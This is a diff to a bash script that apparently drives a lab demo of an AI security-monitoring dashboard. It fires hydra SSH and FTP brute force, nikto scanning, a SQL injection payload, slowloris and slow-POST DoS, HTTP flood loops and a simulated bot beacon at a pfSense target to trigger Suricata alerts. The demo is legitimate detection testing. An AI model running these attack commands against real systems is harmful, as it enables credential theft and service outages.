@@ -23,16 +23,23 @@
 #
 # This is the ONLY script executed during the live demo.
 #
+# ─────────── STORYLINE — WHY NO PORTSCAN PHASE ───────────────────────
+# Reconnaissance (PortScan + ICMP sweep + light TCP probing) was already
+# completed during the silent days 1-5 — see demo/ATTACK_STORYLINE.md
+# and the historical dataset. Day 6 is the EXPLOITATION + IMPACT stage:
+# the attacker already knows what's open and goes straight to credential
+# brute force, web exploits, DoS, and C2 beaconing.
+#
+# This makes the AI "analyze.source" output read like a textbook APT:
+#   Day 1-3 = recon, Day 4-5 = quiet staging, Day 6 = strike.
+#
 # Suricata rules in demo/suricata-rules/local.rules will fire and the
 # backend reshaper (server/index.js → reshapeForDemo) will normalise
-# every alert into one of the 10 ML classes the model was trained on.
-# It will also rewrite dst_ip from 192.168.168.254 → 172.16.16.30 if the
-# log shipper sends WAN-side captures (defensive, since the production
-# tap is on DMZ).
+# every alert into one of the ML classes the model was trained on.
 #
-# Total runtime ≈ 10 minutes. Paced — NOT a flood.
+# Total runtime ≈ 8 minutes. Paced — NOT a flood.
 # REQUIREMENTS on Kali:
-#   apt install -y nmap hydra nikto slowhttptest curl
+#   apt install -y hydra nikto slowhttptest curl
 # =====================================================================
 set -e
 # All targets MUST be the pfSense WAN IP — Kali cannot route to DMZ.
@@ -51,22 +58,14 @@ cat <<EOF | tee "$LOG"
 ║   AI-SOC LIVE DEMO — 2026-04-25 — C1NE.03                 ║
 ║   Source : 192.168.168.23 (Kali)                          ║
 ║   Target : $TARGET                              ║
+║   Stage  : EXPLOITATION + IMPACT                          ║
+║            (recon already done on days 1-5)               ║
 ║   Log    : $LOG               ║
 ╚════════════════════════════════════════════════════════════╝
 EOF
 
 # ---------------------------------------------------------------------
-phase 1 "PortScan — nmap top ports SYN, T3 (90s) — port 80 web only"
-nmap -sS -T3 -p 21,22,23,25,53,80,110,139,445,3306,3389,8080 -Pn "$TARGET" -oN /tmp/p1-nmap.txt >/dev/null &
-NMAP_PID=$!
-sleep 90
-kill $NMAP_PID 2>/dev/null || true
-ok "Expect dashboard: 'PortScan' ALERT"
-
-sleep 5
-
-# ---------------------------------------------------------------------
-phase 2 "SSH-Patator — hydra 4 threads, small wordlist (60s)"
+phase 1 "SSH-Patator — hydra 4 threads, small wordlist (60s)"
 cat > /tmp/u.txt <<EOF
 root
 admin
@@ -85,14 +84,14 @@ ok "Expect: 'SSH-Patator' ALERT (high confidence)"
 sleep 5
 
 # ---------------------------------------------------------------------
-phase 3 "FTP-Patator — hydra 3 threads (45s)"
+phase 2 "FTP-Patator — hydra 3 threads (45s)"
 timeout 45 hydra -L /tmp/u.txt -P /tmp/p.txt -t 3 -f ftp://"$TARGET" >/dev/null 2>&1 || true
 ok "Expect: 'FTP-Patator' ALERT"
 
 sleep 5
 
 # ---------------------------------------------------------------------
-phase 4 "Web Attack — nikto + manual payloads (75s)"
+phase 3 "Web Attack — nikto + manual payloads (75s)"
 timeout 45 nikto -h "http://$WEB_TARGET" -Tuning 1234567890ab -nointeractive >/dev/null 2>&1 || true
 for payload in \
   "/?id=1' UNION SELECT username,password FROM users--" \
@@ -109,21 +108,21 @@ ok "Expect: 'Web Attack' ALERT cluster"
 sleep 5
 
 # ---------------------------------------------------------------------
-phase 5 "DoS slowloris — slowhttptest (60s)"
+phase 4 "DoS slowloris — slowhttptest (60s)"
 timeout 60 slowhttptest -c 200 -H -i 10 -r 50 -t GET -u "http://$WEB_TARGET" -x 24 -p 3 >/dev/null 2>&1 || true
 ok "Expect: 'DoS slowloris' ALERT"
 
 sleep 5
 
 # ---------------------------------------------------------------------
-phase 6 "DoS Slowhttptest — slow POST (60s)"
+phase 5 "DoS Slowhttptest — slow POST (60s)"
 timeout 60 slowhttptest -c 200 -B -i 10 -r 50 -s 8192 -u "http://$WEB_TARGET" -x 24 -p 3 >/dev/null 2>&1 || true
 ok "Expect: 'DoS Slowhttptest' ALERT"
 
 sleep 5
 
 # ---------------------------------------------------------------------
-phase 7 "DoS Hulk — cache-buster HTTP flood (45s)"
+phase 6 "DoS Hulk — cache-buster HTTP flood (45s)"
 END=$((SECONDS + 45))
 while [ $SECONDS -lt $END ]; do
   curl -s -o /dev/null --max-time 1 -H "Cache-Control: no-cache" \
@@ -136,7 +135,7 @@ ok "Expect: 'DoS Hulk' ALERT"
 sleep 5
 
 # ---------------------------------------------------------------------
-phase 8 "DoS GoldenEye-style flood (45s)"
+phase 7 "DoS GoldenEye-style flood (45s)"
 END=$((SECONDS + 45))
 while [ $SECONDS -lt $END ]; do
   curl -s -o /dev/null --max-time 1 \
@@ -151,7 +150,7 @@ ok "Expect: 'DoS GoldenEye' ALERT"
 sleep 5
 
 # ---------------------------------------------------------------------
-phase 9 "Bot / C2 beacon — python-requests UA every 8s (60s)"
+phase 8 "Bot / C2 beacon — python-requests UA every 8s (60s)"
 END=$((SECONDS + 60))
 while [ $SECONDS -lt $END ]; do
   curl -s -o /dev/null --max-time 2 \
@@ -165,5 +164,7 @@ ok "Expect: 'Bot' ALERT (medium confidence)"
 # ---------------------------------------------------------------------
 echo -e "\n${G}╔════════════════════════════════════════════════════════════╗${N}"
 echo -e "${G}║  LIVE DEMO COMPLETE — open dashboard, ask AI for analysis. ║${N}"
+echo -e "${G}║  Tip: select an event from 192.168.168.23 and run          ║${N}"
+echo -e "${G}║       'analyze.source' to see the 5-day APT reconstruction.║${N}"
 echo -e "${G}╚════════════════════════════════════════════════════════════╝${N}"
 echo -e "Log: ${B}$LOG${N}"
